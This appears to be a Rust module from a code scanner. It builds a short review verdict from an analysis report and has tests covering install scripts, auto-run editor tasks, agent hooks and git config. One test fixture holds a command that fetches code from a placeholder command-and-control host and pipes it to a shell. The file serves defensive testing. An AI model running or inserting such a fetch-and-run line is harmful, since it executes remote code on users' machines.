//! The short answer: one verdict and at most five reasons, built only from a finished report.
//!
//! The verdict is never "safe". `nothing_found` means what was read held nothing on the list
//! below, and `complete` says whether everything that should have been read was read. Files that
//! are not code we read (documents, images, native binaries) are counted in `not_examined` in every
//! brief, so the count is never hidden.

use forge_analysis_report::{NotAnalysedKind, Report};
pub use forge_analysis_schema::Scope;
use forge_analysis_schema::{Effect, Lane, ScriptTrigger, UnresolvedReason};
use serde::Serialize;

/// A brief never lists more reasons than this.
pub const MAX_REASONS: usize = 9;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    /// Nothing on the review list was found in what was read, and all of it was read.
    NothingFound,
    /// Something on the review list was found. Look at the report before running the code.
    Review,
    /// Nothing on the review list was found, but part of what should have been read was not.
    Incomplete,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ReasonKind {
    /// Data from the network can reach code execution or a call on it.
    DataReachesCode,
    /// A package script that runs by itself when the package is installed.
    InstallScript,
    /// Code on the install path that spawns processes, uses the network, changes files or loads code.
    InstallTimeEffect,
    /// A command that a tool runs by itself without anyone asking: an editor task set to run on folder
    /// open, an AI-agent hook, an MCP server, a dev container command, a git setting that runs a program,
    /// a build SDK or a package manager script event.
    AutomaticCommand,
    /// Files the tooling reads and acts on by itself (build and tool settings) that were not read.
    AutoRunNotAnalysed,
    /// Archives and packages whose contents were not opened, so anything inside is unseen.
    ArchiveNotOpened,
    /// The run was stopped (time budget or cancel) before every file was read.
    RunStopped,
    /// A quick scan: code that a full run would read was left unread on purpose.
    QuickScope,
    /// Files skipped by a limit, unreadable files, or code that could not be parsed.
    NotFullyRead,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub struct Reason {
    pub kind: ReasonKind,
    pub count: u32,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Brief {
    pub verdict: Verdict,
    pub scope: Scope,
    /// True when nothing that should have been read was left unread.
    pub complete: bool,
    /// At most five, most serious first.
    pub reasons: Vec<Reason>,
    /// Files that are not code we read as code. Always shown, even when zero.
    pub not_examined: u32,
    pub files_analysed: u32,
}

fn count(n: usize) -> u32 {
    u32::try_from(n).unwrap_or(u32::MAX)
}

/// Builds the brief from a report. Pure: the same report always gives the same brief.
pub fn brief(report: &Report) -> Brief {
    let flows = report.flows.len();
    let install_scripts = report
        .scripts
        .iter()
        .filter(|s| matches!(s.trigger, ScriptTrigger::Install | ScriptTrigger::Prepare))
        .count();
    let automatic_commands = report
        .scripts
        .iter()
        .filter(|s| matches!(s.trigger, ScriptTrigger::OnOpen | ScriptTrigger::OnGit | ScriptTrigger::OnBuild))
        .count();
    let install_effects: usize = report
        .effects
        .iter()
        .filter(|g| {
            matches!(
                g.effect,
                Effect::ProcessSpawn
                    | Effect::NetOut
                    | Effect::FsWrite
                    | Effect::FsDelete
                    | Effect::FsChmod
                    | Effect::DynamicLoad
                    | Effect::CodeLoad
            )
        })
        .map(|g| g.items.iter().filter(|i| i.place.lanes.contains(&Lane::Install)).count())
        .sum();

    let stopped: usize = report
        .not_analysed
        .groups
        .iter()
        .filter(|g| g.kind == NotAnalysedKind::Stopped)
        .map(|g| g.items.len())
        .sum();
    let skipped: usize = report
        .not_analysed
        .groups
        .iter()
        .filter(|g| {
            matches!(
                g.kind,
                NotAnalysedKind::TooLarge
                    | NotAnalysedKind::TooDeep
                    | NotAnalysedKind::CapReached
                    | NotAnalysedKind::Unreadable
                    | NotAnalysedKind::Excluded
            )
        })
        .map(|g| g.items.len())
        .sum::<usize>()
        + usize::try_from(report.not_analysed.unrecorded).unwrap_or(usize::MAX);
    let auto_run: usize = report
        .not_analysed
        .groups
        .iter()
        .filter(|g| matches!(g.kind, NotAnalysedKind::AutoRunConfig | NotAnalysedKind::NpmConfig))
        .map(|g| g.items.len())
        .sum();
    let archives: usize = report
        .not_analysed
        .groups
        .iter()
        .filter(|g| g.kind == NotAnalysedKind::Archive)
        .map(|g| g.items.len())
        .sum();
    let out_of_scope: usize = report
        .not_analysed
        .groups
        .iter()
        .filter(|g| g.kind == NotAnalysedKind::OutOfScope)
        .map(|g| g.items.len())
        .sum();
    let quick = report.header.scope == Scope::Quick;
    let unparsed: usize = report
        .unresolved
        .iter()
        .filter(|g| {
            matches!(
                g.reason,
                UnresolvedReason::ParseFailed
                    | UnresolvedReason::TooDeeplyNested
                    | UnresolvedReason::UnsupportedSyntax
            )
        })
        .map(|g| g.items.len())
        .sum();

    let mut reasons: Vec<Reason> = Vec::new();
    for (kind, n) in [
        (ReasonKind::DataReachesCode, flows),
        (ReasonKind::InstallScript, install_scripts),
        (ReasonKind::InstallTimeEffect, install_effects),
        (ReasonKind::AutomaticCommand, automatic_commands),
        (ReasonKind::AutoRunNotAnalysed, auto_run),
        (ReasonKind::ArchiveNotOpened, archives),
        (ReasonKind::RunStopped, stopped),
        (ReasonKind::QuickScope, out_of_scope),
        (ReasonKind::NotFullyRead, skipped.saturating_add(unparsed)),
    ] {
        if n > 0 {
            reasons.push(Reason { kind, count: count(n) });
        }
    }
    reasons.truncate(MAX_REASONS);

    // A quick scan never says it is complete: it left code unread on purpose, and only the files
    // that run by themselves were looked at.
    let complete = !quick && stopped == 0 && skipped == 0 && unparsed == 0 && auto_run == 0 && archives == 0;
    let review = flows > 0 || install_scripts > 0 || install_effects > 0 || automatic_commands > 0;
    let verdict = if review {
        Verdict::Review
    } else if !complete {
        Verdict::Incomplete
    } else {
        Verdict::NothingFound
    };

    Brief {
        verdict,
        scope: report.header.scope,
        complete,
        reasons,
        not_examined: report.overview.files_not_analysed,
        files_analysed: report.overview.files_analysed,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyze_files, MemFile, RunOptions};
    use std::sync::atomic::AtomicBool;
    use std::sync::Arc;

    fn file(path: &str, text: &str) -> MemFile {
        MemFile { path: path.into(), bytes: text.as_bytes().to_vec() }
    }

    fn run(files: Vec<MemFile>, opts: &RunOptions) -> Brief {
        brief(&analyze_files(files, opts).unwrap())
    }

    #[test]
    fn plain_code_gives_nothing_found_and_complete() {
        let b = run(vec![file("index.js", "console.log(1 + 1);\n")], &RunOptions::default());
        assert_eq!(b.verdict, Verdict::NothingFound);
        assert!(b.complete);
        assert!(b.reasons.is_empty());
        assert_eq!(b.files_analysed, 1);
    }

    #[test]
    fn files_that_are_not_code_are_counted_not_hidden() {
        let b = run(
            vec![file("index.js", "let a = 1;\n"), file("README.md", "# hi"), file("logo.png", "x")],
            &RunOptions::default(),
        );
        assert_eq!(b.verdict, Verdict::NothingFound);
        assert_eq!(b.not_examined, 2);
    }

    #[test]
    fn an_install_script_is_a_review_reason() {
        let b = run(
            vec![file("package.json", r#"{"name":"a","scripts":{"postinstall":"node setup.js"}}"#)],
            &RunOptions::default(),
        );
        assert_eq!(b.verdict, Verdict::Review);
        assert!(b.reasons.iter().any(|r| r.kind == ReasonKind::InstallScript && r.count == 1));
    }

    #[test]
    fn a_manual_script_alone_is_not_a_reason() {
        let b = run(
            vec![file("package.json", r#"{"name":"a","scripts":{"start":"node index.js"}}"#)],
            &RunOptions::default(),
        );
        assert!(b.reasons.iter().all(|r| r.kind != ReasonKind::InstallScript));
    }

    #[test]
    fn network_data_reaching_eval_is_a_review_reason() {
        let b = run(
            vec![file("index.js", "const d = await fetch(url).then(r => r.text());\neval(d);\n")],
            &RunOptions::default(),
        );
        assert_eq!(b.verdict, Verdict::Review);
        assert!(b.reasons.iter().any(|r| r.kind == ReasonKind::DataReachesCode));
    }

    #[test]
    fn install_time_code_that_spawns_a_process_is_a_review_reason() {
        let b = run(
            vec![
                file("package.json", r#"{"name":"a","scripts":{"postinstall":"node setup.js"}}"#),
                file("setup.js", "require('child_process').exec('whoami');\n"),
            ],
            &RunOptions::default(),
        );
        assert_eq!(b.verdict, Verdict::Review);
        assert!(b.reasons.iter().any(|r| r.kind == ReasonKind::InstallTimeEffect));
    }

    #[test]
    fn a_file_over_the_size_limit_makes_the_brief_incomplete() {
        let mut opts = RunOptions::default();
        opts.limits.max_file_bytes = 8;
        let b = run(vec![file("big.js", "console.log('a long line of code');\n")], &opts);
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert!(!b.complete);
        assert!(b.reasons.iter().any(|r| r.kind == ReasonKind::NotFullyRead));
    }

    #[test]
    fn code_that_does_not_parse_makes_the_brief_incomplete() {
        let b = run(vec![file("broken.js", "function ( {{{ ;;\n")], &RunOptions::default());
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert!(!b.complete);
    }

    #[test]
    fn a_cancelled_run_is_incomplete_and_lists_every_file_it_did_not_reach() {
        let cancel = Arc::new(AtomicBool::new(true));
        let opts = RunOptions { cancel: Some(cancel), ..RunOptions::default() };
        let b = run(vec![file("a.js", "let a;\n"), file("b.js", "let b;\n")], &opts);
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert!(b.reasons.iter().any(|r| r.kind == ReasonKind::RunStopped && r.count == 2));
        assert_eq!(b.files_analysed, 0);
    }

    #[test]
    fn a_zero_time_budget_stops_before_the_first_file() {
        let opts = RunOptions { time_budget: Some(std::time::Duration::ZERO), ..RunOptions::default() };
        let b = run(vec![file("a.js", "let a;\n")], &opts);
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert!(!b.complete);
    }

    #[test]
    fn review_wins_over_incomplete_but_completeness_is_still_reported() {
        let mut opts = RunOptions::default();
        opts.limits.max_file_bytes = 100;
        let b = run(
            vec![
                file("package.json", r#"{"name":"a","scripts":{"install":"node x.js"}}"#),
                file("big.js", &"let a = 1;\n".repeat(50)),
            ],
            &opts,
        );
        assert_eq!(b.verdict, Verdict::Review);
        assert!(!b.complete);
        assert!(b.reasons.len() <= MAX_REASONS);
    }

    #[test]
    fn the_same_input_gives_the_same_brief_whatever_the_file_order() {
        let a = vec![file("a.js", "fetch(u);\n"), file("package.json", r#"{"scripts":{"postinstall":"x"}}"#)];
        let mut b = a.clone();
        b.reverse();
        assert_eq!(run(a, &RunOptions::default()), run(b, &RunOptions::default()));
    }

    #[test]
    fn the_brief_serialises_with_plain_names() {
        let b = run(vec![file("index.js", "let a;\n")], &RunOptions::default());
        let json = serde_json::to_string(&b).unwrap();
        assert!(json.contains(r#""verdict":"nothing_found""#), "{json}");
        assert!(json.contains(r#""scope":"full""#), "{json}");
    }

    fn quick() -> RunOptions {
        RunOptions { scope: Scope::Quick, ..RunOptions::default() }
    }

    fn hook_project() -> Vec<MemFile> {
        vec![
            file("package.json", r#"{"name":"a","scripts":{"postinstall":"node scripts/setup.js"}}"#),
            file("scripts/setup.js", "require('../lib/x.js');
"),
            file("lib/x.js", "require('child_process').exec('ls');
"),
            file("src/other.js", "console.log(1);
"),
            file("src/more.ts", "export const a = 1;
"),
            file("README.md", "# hi"),
        ]
    }

    fn dotnet_project() -> Vec<MemFile> {
        vec![
            file("Directory.Build.targets", "<Project><Target Name=\"x\" BeforeTargets=\"Restore\"><Exec Command=\"id\" /></Target></Project>"),
            file("src/directory.build.PROPS", "<Project />"),
            file("global.json", "{}"),
            file("NuGet.Config", "<configuration />"),
            file("src/App/App.csproj", "<Project Sdk=\"Microsoft.NET.Sdk\" />"),
            file("src/App/Program.cs", "class P {}"),
        ]
    }

    #[test]
    fn build_files_that_run_by_themselves_are_read_and_a_hooked_exec_is_a_review_in_either_scope() {
        for opts in [RunOptions::default(), quick()] {
            let b = brief(&analyze_files(dotnet_project(), &opts).unwrap());
            // Every file here is read now. The `Exec` in a target hooked before `Restore` runs by itself.
            assert_eq!(b.verdict, Verdict::Review, "{:?}", opts.scope);
            assert_eq!(b.reasons.iter().find(|r| r.kind == ReasonKind::AutomaticCommand).unwrap().count, 1);
            assert!(b.reasons.iter().all(|r| r.kind != ReasonKind::AutoRunNotAnalysed));
        }
    }

    #[test]
    fn an_install_script_still_wins_over_unread_build_files() {
        let mut files = dotnet_project();
        files.push(file("package.json", r#"{"scripts":{"postinstall":"node x.js"}}"#));
        let b = brief(&analyze_files(files, &RunOptions::default()).unwrap());
        assert_eq!(b.verdict, Verdict::Review);
        let kinds: Vec<_> = b.reasons.iter().map(|r| r.kind).collect();
        assert!(kinds.contains(&ReasonKind::InstallScript) && kinds.contains(&ReasonKind::AutomaticCommand));
    }

    #[test]
    fn a_package_manager_config_is_an_unread_file_that_runs_by_itself() {
        let b = run(vec![file("index.js", "let a;
"), file(".npmrc", "registry=https://x.example/")], &RunOptions::default());
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert_eq!(b.reasons.iter().find(|r| r.kind == ReasonKind::AutoRunNotAnalysed).unwrap().count, 1);
    }

    #[test]
    fn git_hooks_and_config_are_seen_and_make_the_brief_incomplete() {
        let files = vec![
            file("index.js", "let a;\n"),
            file(".git/config", "[core]\n\tfsmonitor = x\n"),
            file(".git/hooks/post-checkout", "#!/bin/sh\n"),
            file(".git/hooks/post-checkout.sample", "#!/bin/sh\n"),
            file(".git/HEAD", "ref: x\n"),
        ];
        let b = brief(&analyze_files(files, &RunOptions::default()).unwrap());
        // The config is read: `core.fsmonitor` runs a command on its own, so this is a review.
        assert_eq!(b.verdict, Verdict::Review);
        assert_eq!(b.reasons.iter().find(|r| r.kind == ReasonKind::AutomaticCommand).unwrap().count, 1);
        // The hook is a shell script we cannot read yet; the inert sample and HEAD are not counted.
        assert_eq!(b.reasons.iter().find(|r| r.kind == ReasonKind::AutoRunNotAnalysed).unwrap().count, 1);
    }

    #[test]
    fn a_git_config_with_nothing_automatic_is_read_and_is_not_a_reason() {
        let files = vec![file("index.js", "let a;\n"), file(".git/config", "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = https://x.example/r.git\n")];
        let b = brief(&analyze_files(files, &RunOptions::default()).unwrap());
        assert_eq!(b.verdict, Verdict::NothingFound);
        assert!(b.reasons.is_empty());
    }

    #[test]
    fn commands_that_tools_run_by_themselves_are_a_review_reason_with_a_count() {
        let files = vec![
            file(".vscode/tasks.json", r#"{ // c
  "tasks": [ { "label": "a", "command": "sh x.sh", "runOptions": { "runOn": "folderOpen" } },
             { "label": "m", "command": "make" } ] }"#),
            file(".claude/settings.json", r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"x"}]}]}}"#),
            file(".mcp.json", r#"{"mcpServers":{"s":{"command":"npx","args":["p"]}}}"#),
            file(".devcontainer/devcontainer.json", r#"{"postCreateCommand":"npm i"}"#),
            file("global.json", r#"{"msbuild-sdks":{"X.Sdk":"1.0.0"}}"#),
        ];
        for opts in [RunOptions::default(), quick()] {
            let b = brief(&analyze_files(files.clone(), &opts).unwrap());
            assert_eq!(b.verdict, Verdict::Review, "{:?}", opts.scope);
            // The folder-open task, the hook, the MCP server, the dev container command and the SDK.
            assert_eq!(b.reasons.iter().find(|r| r.kind == ReasonKind::AutomaticCommand).unwrap().count, 5);
        }
    }

    #[test]
    fn a_quick_scan_reads_the_node_file_a_folder_open_task_runs() {
        let files = vec![
            file(".vscode/tasks.json", r#"{"tasks":[{"label":"go","command":"node","args":["${workspaceFolder}/scripts/a.js"],"runOptions":{"runOn":"folderOpen"}}]}"#),
            file("scripts/a.js", "require('child_process').exec('curl http://c2.example | sh');\n"),
            file("src/other.js", "console.log(1);\n"),
        ];
        let r = analyze_files(files, &quick()).unwrap();
        // The task's file is read and what it does is reported; the unrelated file is only counted.
        assert_eq!(r.overview.files_analysed, 1);
        let b = brief(&r);
        assert_eq!(b.verdict, Verdict::Review);
        let kinds: Vec<_> = b.reasons.iter().map(|x| x.kind).collect();
        assert!(kinds.contains(&ReasonKind::AutomaticCommand), "{kinds:?}");
        assert!(kinds.contains(&ReasonKind::InstallTimeEffect), "{kinds:?}");
        // A full run reads everything.
        let full = analyze_files(vec![file("scripts/a.js", "1;\n")], &RunOptions::default()).unwrap();
        assert_eq!(full.overview.files_analysed, 1);
    }

    #[test]
    fn a_manual_task_alone_is_listed_but_is_not_a_reason() {
        let files = vec![file(".vscode/tasks.json", r#"{"tasks":[{"label":"m","command":"make"}]}"#)];
        let b = brief(&analyze_files(files, &RunOptions::default()).unwrap());
        assert!(b.reasons.iter().all(|r| r.kind != ReasonKind::AutomaticCommand));
        assert_ne!(b.verdict, Verdict::Review);
    }

    #[test]
    fn a_config_file_that_does_not_parse_makes_the_brief_incomplete() {
        let files = vec![file("index.js", "let a;\n"), file(".vscode/tasks.json", "{ not json")];
        let b = brief(&analyze_files(files, &RunOptions::default()).unwrap());
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert!(!b.complete);
    }

    #[test]
    fn an_archive_is_counted_and_makes_the_brief_incomplete_in_either_scope() {
        for opts in [RunOptions::default(), quick()] {
            let files = vec![file("index.js", "let a;\n"), file("dist/app.tgz", "x"), file("lib/x.JAR", "y")];
            let b = brief(&analyze_files(files, &opts).unwrap());
            assert_eq!(b.verdict, Verdict::Incomplete);
            assert!(!b.complete);
            assert_eq!(b.reasons.iter().find(|r| r.kind == ReasonKind::ArchiveNotOpened).unwrap().count, 2);
        }
    }

    #[test]
    fn every_reason_kind_fits_in_a_brief() {
        // The list in `brief` has one entry per kind; a cap below that would drop reasons silently.
        assert!(MAX_REASONS >= 9);
    }

    #[test]
    fn quick_reads_the_hook_and_what_it_loads_and_counts_the_rest() {
        let report = analyze_files(hook_project(), &quick()).unwrap();
        // The hook target and the file it requires (`package.json` is not counted as code).
        assert_eq!(report.overview.files_analysed, 2);
        let out_of_scope: Vec<_> = report
            .not_analysed
            .groups
            .iter()
            .filter(|g| g.kind == NotAnalysedKind::OutOfScope)
            .flat_map(|g| g.items.iter().map(|i| i.path.text().to_string()))
            .collect();
        assert_eq!(out_of_scope, vec!["src/more.ts", "src/other.js"]);
        // README.md keeps the kind it has in a full run.
        assert!(report.not_analysed.groups.iter().any(|g| g.kind == NotAnalysedKind::OtherFile));
        assert_eq!(report.header.scope, Scope::Quick);
        assert_eq!(report.overview.completeness, forge_analysis_report::Completeness::Incomplete);
    }

    #[test]
    fn quick_finds_a_payload_one_require_away_from_the_hook() {
        let b = brief(&analyze_files(hook_project(), &quick()).unwrap());
        assert_eq!(b.verdict, Verdict::Review);
        assert_eq!(b.scope, Scope::Quick);
        assert!(!b.complete);
        let kinds: Vec<_> = b.reasons.iter().map(|r| r.kind).collect();
        assert!(kinds.contains(&ReasonKind::InstallScript));
        assert!(kinds.contains(&ReasonKind::InstallTimeEffect));
        let q = b.reasons.iter().find(|r| r.kind == ReasonKind::QuickScope).unwrap();
        assert_eq!(q.count, 2);
    }

    #[test]
    fn a_quick_scan_never_says_nothing_found() {
        let files = vec![file("package.json", r#"{"name":"a"}"#), file("index.js", "console.log(1);
")];
        let b = brief(&analyze_files(files, &quick()).unwrap());
        assert_eq!(b.verdict, Verdict::Incomplete);
        assert!(!b.complete);
        assert_eq!(b.scope, Scope::Quick);

        // Even when no file is left unread, the scope alone keeps it from saying nothing_found.
        let only = brief(&analyze_files(vec![file("package.json", r#"{"name":"a"}"#)], &quick()).unwrap());
        assert_eq!(only.verdict, Verdict::Incomplete);
    }

    #[test]
    fn a_quick_scan_ignores_main_and_bin_but_the_full_run_reads_everything() {
        let files = vec![
            file("package.json", r#"{"name":"a","main":"lib/main.js"}"#),
            file("lib/main.js", "console.log(1);
"),
        ];
        let q = analyze_files(files.clone(), &quick()).unwrap();
        assert_eq!(q.overview.files_analysed, 0);
        let full = analyze_files(files, &RunOptions::default()).unwrap();
        assert_eq!(full.overview.files_analysed, 1);
        assert_eq!(full.header.scope, Scope::Full);
        assert_eq!(brief(&full).scope, Scope::Full);
    }

    #[test]
    fn quick_follows_nested_package_json_and_import_cycles() {
        let files = vec![
            file("package.json", r#"{"name":"root"}"#),
            file("packages/a/package.json", r#"{"name":"a","scripts":{"install":"node i.js"}}"#),
            file("packages/a/i.js", "require('./j.js');
"),
            file("packages/a/j.js", "require('./i.js');
"),
        ];
        let r = analyze_files(files, &quick()).unwrap();
        assert_eq!(r.overview.files_analysed, 2);
        assert_eq!(brief(&r).verdict, Verdict::Review);
    }
}
